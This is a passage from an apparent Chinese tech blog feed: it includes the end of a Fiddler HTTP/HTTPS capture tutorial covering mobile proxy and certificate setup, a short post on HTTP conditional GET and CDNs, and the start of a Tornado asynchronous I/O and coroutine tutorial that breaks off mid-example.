rel="noopener">http://localhost:2391/Default.aspx，</a> 加个点号后，变成 <a href="http://localhost.:2391/Default.aspx" target="_blank" rel="noopener">http://localhost.:2391/Default.aspx</a> 就可以了。</p><p><img src="http://ww2.sinaimg.cn/mw690/625782c8gw1elxke97x0zj20gk0da40f.jpg" alt></p><h4 id="移动端抓包"><a href="#移动端抓包" class="headerlink" title="移动端抓包"></a>移动端抓包</h4><p>Fiddler不但能截获各种浏览器发出的HTTP请求, 也可以截获各种智能手机发出的HTTP/HTTPS请求。</p><p>Fiddler能捕获IOS,Andriod,WinPhone,设备发出的请求，同理，也可以截获IPad, MacBook的等设备发出的HTTP/HTTPS。</p><p>前提条件是：安装Fiddler的机器，跟Iphone 在同一个网络里， 否则IPhone不能把HTTP发送到Fiddler的机器上来。</p><p>具体操作步骤如下：</p><ul><li>Fiddler设置</li></ul><p>打开Fiddler，Tools-》Fiddler Options。(配置完记得要重启Fiddler)</p><p>选中“Allow remote computers to connect”，是允许别的机器把HTTP/HTTPS请求发送到Fiddler上来</p><p><img src="http://ww1.sinaimg.cn/mw690/625782c8gw1elxkl6mft1j20fi0ad406.jpg" alt></p><ul><li><p>获取Fiddler所在机器IP</p></li><li><p>安装Fiddler证书</p><p>这一步是为了让Fiddler能捕获HTTPS请求。 如果你只需要截获HTTP请求， 可以忽略这一步，首先要知道Fiddler所在的机器的IP地址：假如我安装了Fiddler的机器的IP地址是:192.168.1.104<br>打开手机的浏览器, 访问 <a href="http://192.168.1.104:8888，" target="_blank" rel="noopener">http://192.168.1.104:8888，</a> 点”FiddlerRoot certificate” 然后安装证书。</p><p>再打开手机, 找到你的网络连接， 打开HTTP代理， 输入Fiddler所在机器的IP地址(比如:192.168.1.104) 以及Fiddler的端口号8888</p></li></ul><p>另一种方式是通过WiFi，理解Fiddler抓取移动端的数据包，看看下面这张图；</p><p><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160120124738422-909023754.png" alt></p><p>​    可以看出，移动端的数据包都是需要走WiFi出去的，因此我们可以把电脑热点打开，将手机连上电脑，Fiddler开启代理后，让这些数据通过Fiddler，Fiddler就可以抓到这些包，然后发给路由器。</p><p><img src="https://images2015.cnblogs.com/blog/626593/201601/626593-20160120124739218-1083286524.png" alt></p><h4 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h4><ul><li>《Fiddler调试权威指南》</li></ul><p>​        这本书是Fiddler的开发者Eric Lawrence编写的一本权威的参考指南。全书分为10章和4个附录，从认识Fiddler开始，介绍了基本技巧和概念、配置选项、Inspectors、扩展、数据流导入导出、FiddlerScript和FiddlerCore等主题；附录部分还给出了故障排除和命令行等有用的参考信息。</p><p>​    它适合Web开发人员和Web测试人员阅读参考，也适合想要学习和掌握Fiddler的读者阅读。通过《Fiddler调试权威指南》，你将学会如何利用Fiddler调试Web相关的应用，掌握如何调试HTTPS数据流，学会如何在流行的设备上使用Fiddler，甚至掌握更多高级的扩展功能。</p><h4 id="其他同类抓包工具"><a href="#其他同类抓包工具" class="headerlink" title="其他同类抓包工具"></a>其他同类抓包工具</h4><p>​    同类的工具有 : HttpWatch, Firebug,Chrome自带调试工具，WireShark</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>Fiddler能记录所有客户端和服务器的<code>HTTP</code>和<code>HTTPS</code>请求，允许你监视、设置断点，甚至修改输入输出数据，Fiddler包含了一个强大的基于事件脚本的子系统，并且能使用<code>.NET</code>语言进行扩展；</li><li>你对<code>HTTP</code>协议越了解，你就能越掌握Fiddler的使用方法，你越使用Fiddler,就越能帮助你了解<code>HTTP</code>协议，两者关系紧密、相辅相成；</li><li>强大图形呈现，拖拽操作，丰富的插件。</li><li>使用Fiddler无论对<code>Coder</code>还是<code>Tester</code>来说，都是非常有用的工具。</li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li><a href="https://www.cnblogs.com/yyhh/p/5140852.html" target="_blank" rel="noopener">Fiddler抓包工具总结</a></li><li><a href="https://www.cnblogs.com/FounderBox/p/4653588.html?utm_source=tuicool" target="_blank" rel="noopener">Fiddler教程</a></li><li><a href="https://docs.telerik.com/fiddler/configure-fiddler/tasks/configurefiddler" target="_blank" rel="noopener">Fiddler官方教程</a></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> debug工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fiddler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP</title>
      <link href="/2019/08/17/HTTP/"/>
      <url>/2019/08/17/HTTP/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="HTTP-条件-GET-使用的方法？"><a href="#HTTP-条件-GET-使用的方法？" class="headerlink" title="HTTP 条件 GET 使用的方法？"></a>HTTP 条件 GET 使用的方法？</h2><p>​    客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。</p><p>​    下面是一个具体的发送接受报文示例：</p><p>​    客户端发送请求：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: www.sina.com.cn:80  </span><br><span class="line">If-Modified-Since:Thu, 4 Feb 2010 20:39:13 GMT  </span><br><span class="line">Connection: Close</span><br></pre></td></tr></tbody></table></figure><pre><code>第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件</code></pre><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 304 Not Modified  </span><br><span class="line">Date: Thu, 04 Feb 2010 12:38:41 GMT  </span><br><span class="line">Content-Type: text/html  </span><br><span class="line">Expires: Thu, 04 Feb 2010 12:39:41 GMT  </span><br><span class="line">Last-Modified: Thu, 04 Feb 2010 12:29:04 GMT  </span><br><span class="line">Age: 28  </span><br><span class="line">X-Cache: HIT from sy32-21.sina.com.cn  </span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>​    CDN的全称是Content Delivery Network，即内容分发网络，是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户</p><p>​    内容分发网络节点会在多个地点，多个不同的网络上摆放。这些节点之间会动态的互相传输内容，对用户的下载行为最优化，并借此减少内容供应者所需要的带宽成本，改善用户的下载速度，提高系统的稳定性。</p><p>内容分发网络所需要的节点数量随着需求而不同，依照所需要服务的对象大小，有可能有数万台服务器</p></body></html>]]></content>
      
      
      <categories>
          
          <category> HTTP协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Tornado</title>
      <link href="/2019/04/03/%E6%B5%85%E8%B0%88Tornado/"/>
      <url>/2019/04/03/%E6%B5%85%E8%B0%88Tornado/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="高并发处理框架—Tornado"><a href="#高并发处理框架—Tornado" class="headerlink" title="高并发处理框架—Tornado"></a>高并发处理框架—Tornado</h2><h3 id="Tornado介绍"><a href="#Tornado介绍" class="headerlink" title="Tornado介绍"></a>Tornado介绍</h3><p>​    Tornado是一个可扩展的非阻塞式Web服务器及其相关工具的开源版本。Tornado每秒可以处理数以千计的；连接，对于实时的Web服务来说，Tornado是一个理想的Web框架。</p><p>​    Tornado是使用Python编写的一个强大的可扩展的Web服务器，它在处理高网络流量时表现得足够强健,却在创建和编写时有着足够的轻量级，并且能够被用在大量的应用和工具中。相比于其他的Python网络框架，Tornado有如下特点。</p><ul><li><p>完备的Web框架：与Django，Flask等一样，Tornado也提供了URL路由映射、Request上下文、基于模板的页面渲染技术等开发Web应用的必备工具。</p></li><li><p>是一个高效的网络库，性能与Twisted、Gevent等底层Python框架相媲美：提供了异步I/O支持、超时事件处理。这使得Tornado除了可以作为Web应用服务器框架，还可以用来做爬虫应用、物联网关、游戏服务器等后台应用。</p></li><li><p>提供高效的HTTPClient：除了服务器端框架，Tornado还提供了基于异步框架的HTTP客户端。</p></li><li><p>提供高效的内部HTTP服务器：虽然其他Python网络框架（Django，Flask）也提供了内部HTTP服务器，但它们的HTTP服务器由于性能原因只能用于测试环境。而Tornado的HTTP服务器与Tornado异步调用紧密结合，可以直接用于生产环境。</p></li><li><p>完备的WebSocket支持：WebSocket是HTML5的一种新标准，实现了浏览器与服务器之间的双向实时通信。</p><p>因为Tornado的上述特点，Tornado常被用作大型站点的接口服务框架，而不像Django那样着眼于建立完整的大型网站，着重讲解Tornado的异步及协程编程、身份认证框架、独特的非WSGI部署方式。</p></li></ul><h4 id="安装Tornado"><a href="#安装Tornado" class="headerlink" title="安装Tornado"></a>安装Tornado</h4><p>​    Tornado已经被配置到PyPI网站中，使得Tornado的安装非常简单。在Windows和Linux中都可以通过一条pip命令来完成安装。</p><p>​    <code>pip install tornado</code></p><p>​    该条命令可以运行在操作系统中或python虚环境中。安装信息如下图所示：</p><p>​    <img src="http://a2.qpic.cn/psb?/V11LBpl80UoTHW/Jm50BeD7cX0qxRLR7i1V7XbK42nzk7CANR1XpQtRz2Y!/m/dDUBAAAAAAAAnull&bo=DwR9AgAAAAADB1Y!&rf=photolist&t=5" alt></p><h4 id="异步及协程基础"><a href="#异步及协程基础" class="headerlink" title="异步及协程基础"></a>异步及协程基础</h4><p>​    协程是Tornado中推荐的编程方式，使用协程可以开发出简捷，高效的异步处理代码。本章从同步I/O、异步I/O开始，逐步理解和掌握基于Tornado协程的编程技术。</p><h5 id="同步和异步I-O"><a href="#同步和异步I-O" class="headerlink" title="同步和异步I/O"></a>同步和异步I/O</h5><p>​    从计算机硬件发展的角度来看，当今计算机系统的CPU和内存发展速度日新月异，摩尔定律体现的十分明显。与之同时的硬盘、网络等于I/O相关的速度指标却进度缓慢。因此，在如今的计算机应用开发中，减少程序在I/O操作中的等待是对资源消耗、提高并发程度的必要考虑。</p><p>​    根据<em>Unix Network Programing</em> 一书中的定义，同步I/O操作(<em>synchronous I/O operation</em>)导致请求进程阻塞，直到I/O操作完成；异步I/O操作（asynchronous I/O operation）不导致请求进程阻塞。在Python中，同步I/O可以被理解为一个被调用的I/O函数会阻塞调用函数的执行，而异步I/O则不会阻塞调用函数的执行。代码举例如下:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado.httpclient <span class="keyword">import</span> HTTPClient<span class="comment">#Tornado的HTTP客户端</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synchronous_visit</span><span class="params">()</span>:</span></span><br><span class="line">    http_client = HTTPClient()</span><br><span class="line">response = http_client.fetch(<span class="string">"www.baidu.com"</span>)<span class="comment">#阻塞，直到对www.baidu.com访问完成</span></span><br><span class="line">    print(response.body)</span><br></pre></td></tr></tbody></table></figure><p>​    HTTPClient是Tornado的同步访问HTTP客户端。上述代码中的synchronous_visit()函数使用了典型的同步I/O操作访问<a href="http://www.baidu.com网站，该函数的执行时间取决于网络速度、对方服务器响应速度等，只有等到对www.baidu.com的访问完成后并获取到结果后，才能完成对synchronous_visit函数的执行。" target="_blank" rel="noopener">www.baidu.com网站，该函数的执行时间取决于网络速度、对方服务器响应速度等，只有等到对www.baidu.com的访问完成后并获取到结果后，才能完成对synchronous_visit函数的执行。</a></p><p>​    而使用异步I/O访问<a href="http://www.baidu.com网站的函数无需等待访问完成才能返回，譬如：" target="_blank" rel="noopener">www.baidu.com网站的函数无需等待访问完成才能返回，譬如：</a></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado.httpclient <span class="keyword">import</span> AsyncHTTPClient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_response</span><span class="params">(response)</span>:</span></span><br><span class="line">    print(response.body)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asynchronous_visit</span><span class="params">()</span>:</span></span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    http_client.fetch(<span class="string">"www.baidu.com"</span>,callback=handle_response)</span><br></pre></td></tr></tbody></table></figure><p>​    AsyncHTTPClient是Tornado的异步访问HTTP客户端。在上述代码的asynchronous_visit函数中使用AsyncHTTPClient对第三方网站进行异步访问，http_client.fetch()函数会在调用后立刻返回而无需等待实际返回的完成，从而导致asynchronous_visit()也会立刻执行完成。当对<a href="http://www.baidu.com的访问实际完成后，AsyncHTTPClient会调用callback参数指定的函数，开发者可以在其中写入处理访问结果的逻辑代码。" target="_blank" rel="noopener">www.baidu.com的访问实际完成后，AsyncHTTPClient会调用callback参数指定的函数，开发者可以在其中写入处理访问结果的逻辑代码。</a></p><h5 id="yield关键字"><a href="#yield关键字" class="headerlink" title="yield关键字"></a>yield关键字</h5><p>​    协程是Tornado中进行异步I/O代码开发的方法，协程使用了Python的关键字yield将调用者挂起和恢复执行。在理解协程概念前，应首先理解Python中yield关键字的概念和使用方法，而学习yield之前需要了解迭代器的概念。</p><p>​    <strong>1. 迭代器</strong> </p><p>​    迭代器(Iterator)是访问集合内元素的一种方式。迭代器对象从集合的第1个元素开始访问，直到所有元素都被访问一遍后结束。迭代器不能回退，只能往前进行迭代。</p><p>​    Python中最常使用迭代器的场景是循环语句for，它用迭代器封装集合，并且逐个访问集合元素以执行循环体。比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#range返回一个列表</span></span><br><span class="line">    print(number)</span><br></pre></td></tr></tbody></table></figure><p>​    其中的range()返回一个包含所指定元素的集合，而for语句将其封装一个迭代器后访问，使用iter()调用可以将列表、集合转换为迭代器，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wjq@Ubuntu:~$ python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Jul <span class="number">18</span> <span class="number">2016</span>, <span class="number">15</span>:<span class="number">02</span>:<span class="number">52</span>) </span><br><span class="line">[GCC <span class="number">4.8</span><span class="number">.4</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">>>> </span>numbers = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line"><span class="meta">>>> </span>t = iter(numbers)</span><br><span class="line"><span class="meta">>>> </span>print(t)</span><br><span class="line"><listiterator object at <span class="number">0x7fd46be79050</span>></span><br></pre></td></tr></tbody></table></figure><p>​    其中，t就是迭代器。迭代器与普通的Python对象的区别是迭代器有一个next()方法，每次调用该方法可以返回一个元素。调用者可以通过不断调用next()方法来逐个访问集合元素。比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">>>> </span>iter = iter(range(<span class="number">6</span>))</span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>​    调用者可以一直这样调用next()方法来访问迭代器，直到next()方法返回StopIteration异常以表示迭代已经完成，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">>>> </span>print(iter.next())</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"<stdin>"</span>, line <span class="number">1</span>, <span class="keyword">in</span> <module></span><br><span class="line">StopIteration</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><p>​    <strong>2. 使用yield</strong> </p><p>​    迭代器在Python编程中适用范围很广，开发者可以使用yield定制自己的迭代器。<strong><em>调用任何定义中包含yield关键字的函数都不会执行该函数，而是会获得一个对应该函数的迭代器。</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code example:</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demoIterator</span><span class="params">()</span>:</span>     <span class="comment">#定义一个迭代器函数</span></span><br><span class="line">    print(<span class="string">"first call of next()"</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    print(<span class="string">"second call of next()"</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    print(<span class="string">"third call of next()"</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> demoIterator():</span><br><span class="line">    print(i)</span><br></pre></td></tr></tbody></table></figure><p>​    执行该部分代码结果如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh://wjq@<span class="number">59.68</span><span class="number">.29</span>.xx:<span class="number">22</span>/home/wjq/TornadoWork/tor_env/bin/python -u /home/wjq/TornadoWork/tornado_0/temp/demo/<span class="number">7</span>_1.py</span><br><span class="line">first call of next()</span><br><span class="line"><span class="number">1</span></span><br><span class="line">second call of next()</span><br><span class="line"><span class="number">3</span></span><br><span class="line">third call of next()</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></tbody></table></figure><p>​    每次调用迭代器的next()函数，将执行迭代器函数。并返回yield的结果作为迭代返回元素。当迭代器函数return时，迭代器会抛出StopIteration异常使迭代终止。</p><p>​    注：在Python中，使用yield关键字定义的迭代器也被称为”生成器”。</p><h5 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h5><p>​    使用Tornado协程可以开发出类似同步代码的异步行为，并且因为协程本身不使用线程，所以减少了线程上下文切换的开销，是一种更为高效的开发模式。</p><p>​    <strong>1.  编写协程函数</strong></p><p>​    使用协程技术开发网页访问的代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado <span class="keyword">import</span> gen<span class="comment">#引入协程库gen</span></span><br><span class="line"><span class="keyword">from</span> tornado.httpclient <span class="keyword">import</span> AsyncHTTPClient</span><br><span class="line"></span><br><span class="line"><span class="meta">@gen.coroutine#使用gen.coroutine修饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine_visit</span><span class="params">()</span>:</span></span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    response = <span class="keyword">yield</span> http_client.fetch(<span class="string">"www.baidu.com"</span>)</span><br><span class="line">    print(response.body)</span><br></pre></td></tr></tbody></table></figure><p>​    本例中仍然使用异步客户端AsyncHTTPClient进行页面访问，使用@gen.coroutine表明用装饰器声明这是一个协程函数。由于yield关键字的使用，使得代码中不用再编写回调函数用于处理访问结果，而可以直接在yield语句的后面编写结果处理语句。</p><p>​    <strong>2.  编写协程函数</strong></p><p>​    <strong>由于Tornado协程基于Python的yield关键字实现，所以不能像调用普通函数一样调用协程函数。</strong> 协程函数可以通过以下三种方式进行调用。</p><ul><li><p>在本身是协程的函数内通过yield关键字调用。</p></li><li><p>在IOLoop尚未启动时，通过IOLoop的run_sync()函数调用。</p></li><li><p>在IOLoop已经启动时，通过IOLoop的spawn_callback()函数调用。</p><p>举一个“通过协程函数调用协程函数”的例子：</p></li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado <span class="keyword">import</span> gen<span class="comment"># 引入协程库gen</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@gen.coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer_coroutine</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start call another coroutine"</span>)</span><br><span class="line">    <span class="keyword">yield</span> coroutine_visit()</span><br><span class="line">    print(<span class="string">"end of outer_coroutine"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    本例中coroutine_visit和outer_coroutine都是协程函数，所以它们之间可以通过yield关键字进行调用。IOLoop是Tornado的主事件循环对象，Tornado程序通过它监听外部客户端的访问请求，并执行相应的操作。当程序尚未进入IOLoop的running状态时，可以通过run_sync()函数调用协程函数。比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop<span class="comment">#引入IOLoop对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_normal</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start to call a coroutine"</span>)</span><br><span class="line">IOLoop.current().run_sync(<span class="keyword">lambda</span>: coroutine_visit())</span><br><span class="line">    print(<span class="string">"end of calling a coroutine"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    此处无需过分了解IOLoop，后面会逐步了解IOLoop的具体概念及应用方法。</p><p>​    上例中引用tornado.ioloop包中的IOLoop对象，之后在普通函数中使用run_sync()函数调用经过lambda封装的协程函数。run_sync()函数将阻塞当前函数的执行，直到被调用的协程执行完成。</p><p>​    事实上，Tornado要求协程函数在IOLoop的runing状态中才能被调用，只不过run_sync函数自动完成了启动、停止IOLoop的步骤，它的实现逻辑为：启动IOLoop—>调用被lambda封装的协程函数—>停止IOLoop。当Tornado程序已经处于running状态时的协程函数的调用示例如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop<span class="comment">#引入IOLoop对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_normal</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start to call a coroutine"</span>)</span><br><span class="line">    IOLoop.current().spawn_callback(coroutine_visit)</span><br><span class="line">    print(<span class="string">"end of calling a coroutine"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    本例中spawn_callback()函数将不会等待被调用协程执行完成。所以spawn_callback()之前和之后的print语句将会被连续执行，而coroutine_visit本身将会由IOLoop在合适的时机进行调用。</p><p>​    IOLoop的spawn_callback()函数没有为开发者提供获取协程函数调用返回值的方法，所以只能用spawn_callback()调用没有返回值的协程函数。</p><p>​    <strong>3.  在协程中调用阻塞函数</strong></p><p>​    在协程中直接调用阻塞函数会影响协程本身的性能，所以Tornado提供了在协程中利用线程池调度阻塞函数，从而不影响协程本身继续执行的方法。示例如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">thread_tool = ThreadPoolExecutor(<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mySleep</span><span class="params">(count)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@gen.coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_blocking</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start of call_blocking"</span>)</span><br><span class="line">    <span class="keyword">yield</span> thread_pool.submit(mySleep,<span class="number">10</span>)</span><br><span class="line">    print(<span class="string">"end of call_blocking"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    代码中首先引用了concurrent.futures中的ThreadPoolExecutor类，并实例化了一个有两个线程的线程池thread_pool。在需要调用阻塞函数的协程call_blocking中，使用thread_pool.submit调用阻塞函数，并通过yield返回。这样便不会阻塞协程所在线程的继续执行，也保证了阻塞函数前后代码的执行顺序。</p><p>​    <strong>4.  在协程中等待多个异步调用</strong></p><p>​    目前只讲述了协程中一个yield关键字等待一个异步调用，实际上tornado允许在协程中用一个yield关键字等待多个异步调用，只需要把这些调用用列表(list)或字典(dictionary)的方式传递给yield关键字即可。</p><p>​    使用列表方式传递多个异步调用的示例代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado <span class="keyword">import</span> gen<span class="comment"># 引入协程库</span></span><br><span class="line"><span class="keyword">from</span> tornado.httpclient <span class="keyword">import</span> AsyncHTTPClient</span><br><span class="line"></span><br><span class="line"><span class="meta">@gen.coroutine# 使用gen.coroutine修饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine_visit</span><span class="params">()</span>:</span></span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    list_response = <span class="keyword">yield</span>[ http_client.fetch(<span class="string">"www.baidu.com"</span>),</span><br><span class="line">                         http_client.fetch(<span class="string">"www.sina.com"</span>),</span><br><span class="line">                        http_client.fetch(<span class="string">"www.163.com"</span>),</span><br><span class="line">                        http_client.fetch(<span class="string">"www.google.com"</span>)</span><br><span class="line">                         ]</span><br><span class="line">   <span class="keyword">for</span> response <span class="keyword">in</span> list_response:</span><br><span class="line">       <span class="keyword">print</span> response.body</span><br></pre></td></tr></tbody></table></figure><p>​    在代码中仍然用@gen.coroutine装饰器定义协程，在需要yield的地方用列表传递若干个异步调用，只有在列表中的所有调用都执行完成后，yield才会返回并继续执行。yield以列表形式返回N个调用的输出结果，可以通过for语句逐个访问。</p><p>​    使用字典方式传递多个异步调用的示例代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 